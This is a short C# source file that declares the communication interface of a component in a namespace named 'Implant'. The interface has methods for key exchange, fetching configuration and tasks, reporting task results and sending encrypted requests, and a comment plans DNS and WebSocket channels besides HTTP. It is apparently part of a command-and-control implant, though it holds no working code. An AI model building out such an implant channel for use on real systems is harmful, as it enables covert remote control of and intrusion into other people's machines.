using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

// Interface for communication. Right now only HTTP implemented but I need to make DNS/WebSocket/Other?
namespace Implant
{
 
    interface CommunicationProviderInterface
    {

        public void keyExchangeSetup();

        public Config getConfig();

        public Task getNextTask();

        public void updateTaskResult(string UUID, string result);

        public string sendEncryptedRequest(string body, string endpoint);
    }
}
